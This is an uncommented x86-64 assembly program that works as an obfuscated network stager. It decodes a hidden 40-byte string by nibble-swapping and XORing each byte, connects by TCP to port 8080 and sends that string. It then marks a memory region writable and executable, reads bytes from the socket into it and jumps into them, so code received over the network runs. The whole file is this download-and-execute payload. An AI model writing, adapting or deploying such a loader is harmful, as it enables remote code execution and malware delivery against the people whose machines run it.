	.section .text

	.globl _start

_start:
	addq	$0xffffffffffffffd0,%rsp
	xorq	%rax,%rax
	pushq	%rax
	movq	$0x84f484f427a727a7,%rax
	pushq	%rax
	movq	$0x876313d2a2e23212,%rax
	pushq	%rax
	movq	$0xd2e226876313d2a0,%rax
	pushq	%rax
	movq	$0x84f437c637d62161,%rax
	pushq	%rax
	movq	$0x61a026d626617050,%rax
	pushq	%rax
	xorl	%ecx,%ecx
	jmp	.L0
.L1:
	leaq	(%rsp),%r8
	addq	%rcx,%r8
	movb	(%r8),%r9b
	movb	%r9b,%r10b
	shlb	$4,%r10b
	shrb	$4,%r9b
	orb	%r10b,%r9b
	xorb	$0x42,%r9b
	movb	%r9b,(%r8)
	addl	$1,%ecx
.L0:
	cmpl	$0x28,%ecx
	jl	.L1
	movl	$0x29,%eax
	movl	$0x2,%edi
	movl	$0x1,%esi
	xorl	%edx,%edx
	syscall
	test	%eax,%eax
	je	.L2
	movl	%eax,0x58(%rsp)
	xorq	%rax,%rax
	movq	%rax,0x40(%rsp)
	movq	%rax,0x48(%rsp)
	movw	$0x2,0x40(%rsp)
	movw	$0x901f,0x42(%rsp)
	movl	$0x2a,%eax
	movl	0x58(%rsp),%edi
	leaq	0x40(%rsp),%rsi
	movl	$0x10,%edx
	syscall
	cmpl	$0xffffffff,%eax
	je	.L2
	movl	$1,%eax
	movl	0x58(%rsp),%edi
	leaq	(%rsp),%rsi
	movl	$0x28,%edx
	syscall
	cmpl	$0x28,%eax
	jne	.L2
	movl	$0xa,%eax
	movl	$0x401000,%edi
	movl	$0x1000,%esi
	movl	$0x7,%edx
	syscall
	movl	$0x7d,0x38(%rsp)
	movq	$0x401a00,0x30(%rsp)
.L4:
	xorl	%eax,%eax
	movl	0x58(%rsp),%edi
	movq	0x30(%rsp),%rsi
	movl	0x38(%rsp),%edx
	syscall
	addl	%eax,0x30(%rsp)
	subl	%eax,0x38(%rsp)
	test	%eax,%eax
	jle 	.L3
	cmpl	$0,0x38(%rsp)
	jg	.L4
.L3:
	movl	$0x3,%eax
	movl	0x58(%rsp),%edi
	syscall
	movl	$0x401a4c,%eax
	call	*%rax
.L2:
	xorl	%edi,%edi
	addq	$0x60,%rsp
	movl	$0x3c,%eax
	syscall
